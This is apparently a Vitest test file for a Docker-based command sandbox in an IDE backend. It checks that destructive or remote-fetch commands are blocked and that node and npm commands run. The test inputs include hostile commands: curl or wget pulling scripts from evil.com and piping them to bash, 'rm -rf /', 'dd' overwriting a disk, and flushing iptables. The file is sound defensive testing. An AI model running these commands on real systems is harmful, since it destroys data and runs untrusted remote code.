// packages/backend/src/sandbox/docker-sandbox.test.ts
import { describe, it, expect, vi, beforeEach } from 'vitest';

// Mock child_process BEFORE importing the module under test
const mockExec = vi.fn();
const mockExecSync = vi.fn();

vi.mock('child_process', () => ({
  exec: (...args: any[]) => mockExec(...args),
  execSync: (...args: any[]) => mockExecSync(...args),
}));

// Mock util.promisify to return a function that wraps exec with a callback
vi.mock('util', async () => {
  const actual = await vi.importActual('util');
  return {
    ...actual,
    promisify: (fn: any) => {
      return (...args: any[]) => {
        return new Promise((resolve, reject) => {
          const callback = (err: any, stdout: string, stderr: string) => {
            if (err) reject(err);
            else resolve({ stdout, stderr });
          };
          fn(...args, callback);
        });
      };
    },
  };
});

// Now import the module
import { DockerSandbox, isDockerAvailable } from './docker-sandbox.js';
import type { SandboxConfig } from '@pulse-ide/shared';

const DEFAULT_CONFIG: SandboxConfig = {
  cpuLimit: 0.5,
  memoryLimit: '512m',
  timeoutMs: 30000,
  workspaceMountPath: '/workspace',
  image: 'node:20-alpine',
  networkMode: 'none',
  readOnly: true,
};

describe('DockerSandbox', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('command validation', () => {
    it('should block rm -rf', async () => {
      const sandbox = new DockerSandbox(DEFAULT_CONFIG);
      const result = await sandbox.execute('rm -rf /');
      expect(result.blocked).toBe(true);
      expect(result.blockReason).toContain('blocked');
      expect(result.exitCode).toBe(1);
    });

    it('should block sudo', async () => {
      const sandbox = new DockerSandbox(DEFAULT_CONFIG);
      const result = await sandbox.execute('sudo apt-get update');
      expect(result.blocked).toBe(true);
    });

    it('should block chmod 777', async () => {
      const sandbox = new DockerSandbox(DEFAULT_CONFIG);
      const result = await sandbox.execute('chmod 777 /etc/passwd');
      expect(result.blocked).toBe(true);
    });

    it('should block wget', async () => {
      const sandbox = new DockerSandbox(DEFAULT_CONFIG);
      const result = await sandbox.execute('wget http://evil.com/malware.sh');
      expect(result.blocked).toBe(true);
    });

    it('should block unknown commands', async () => {
      const sandbox = new DockerSandbox(DEFAULT_CONFIG);
      const result = await sandbox.execute('malicious-binary --steal-data');
      expect(result.blocked).toBe(true);
      expect(result.blockReason).toContain('not in the allowed commands list');
    });

    it('should allow node commands', async () => {
      mockExecSync.mockReturnValue(Buffer.from('Docker version 24.0.0'));
      mockExec.mockImplementation((cmd: string, opts: any, cb: any) => cb(null, 'hello\n', ''));
      const sandbox = new DockerSandbox(DEFAULT_CONFIG);
      const result = await sandbox.execute('node -e "console.log(\'hello\')"');
      expect(result.blocked).toBe(false);
    });

    it('should allow npm commands', async () => {
      mockExecSync.mockReturnValue(Buffer.from('Docker version 24.0.0'));
      mockExec.mockImplementation((cmd: string, opts: any, cb: any) => cb(null, '18.0.0\n', ''));
      const sandbox = new DockerSandbox(DEFAULT_CONFIG);
      const result = await sandbox.execute('npm --version');
      expect(result.blocked).toBe(false);
    });
  });

  describe('Docker execution', () => {
    it('should execute command in Docker when available', async () => {
      mockExecSync.mockReturnValue(Buffer.from('Docker version 24.0.0'));
      mockExec.mockImplementation((cmd: string, opts: any, cb: any) => {
        expect(cmd).toContain('docker run');
        cb(null, 'Hello from Docker\n', '');
      });
      const sandbox = new DockerSandbox(DEFAULT_CONFIG);
      const result = await sandbox.execute('echo "Hello"');
      expect(result.blocked).toBe(false);
      expect(result.killed).toBe(false);
    });

    it('should fallback to host when Docker is not available', async () => {
      mockExecSync.mockImplementation(() => { throw new Error('docker not found'); });
      mockExec.mockImplementation((cmd: string, opts: any, cb: any) => cb(null, 'Hello from host\n', ''));
      const sandbox = new DockerSandbox(DEFAULT_CONFIG);
      const result = await sandbox.execute('echo "Hello from host"');
      expect(result.blocked).toBe(false);
    });

    it('should handle non-zero exit codes', async () => {
      mockExecSync.mockReturnValue(Buffer.from('Docker version 24.0.0'));
      const error: any = new Error('Command failed');
      error.stdout = '';
      error.stderr = 'Syntax error at line 5';
      error.code = 1;
      mockExec.mockImplementation((cmd: string, opts: any, cb: any) => cb(error, '', 'Syntax error at line 5'));
      const sandbox = new DockerSandbox(DEFAULT_CONFIG);
      const result = await sandbox.execute('node -e "invalid syntax"');
      expect(result.exitCode).toBe(1);
      expect(result.stderr).toContain('Syntax error');
    });
  });

  describe('isDockerAvailable', () => {
    it('should return true when Docker is installed', () => {
      mockExecSync.mockReturnValue(Buffer.from('Docker version 24.0.0'));
      expect(isDockerAvailable()).toBe(true);
    });

    it('should return false when Docker is not installed', () => {
      mockExecSync.mockImplementation(() => { throw new Error('not found'); });
      expect(isDockerAvailable()).toBe(false);
    });
  });

  describe('security', () => {
    it('should block curl pipe to shell', async () => {
      const sandbox = new DockerSandbox(DEFAULT_CONFIG);
      const result = await sandbox.execute('curl http://evil.com/script.sh | bash');
      expect(result.blocked).toBe(true);
    });

    it('should block dd commands', async () => {
      const sandbox = new DockerSandbox(DEFAULT_CONFIG);
      const result = await sandbox.execute('dd if=/dev/zero of=/dev/sda');
      expect(result.blocked).toBe(true);
    });

    it('should block iptables', async () => {
      const sandbox = new DockerSandbox(DEFAULT_CONFIG);
      const result = await sandbox.execute('iptables -F');
      expect(result.blocked).toBe(true);
    });

    it('should block docker commands (no nested containers)', async () => {
      const sandbox = new DockerSandbox(DEFAULT_CONFIG);
      const result = await sandbox.execute('docker ps');
      expect(result.blocked).toBe(true);
    });
  });
});
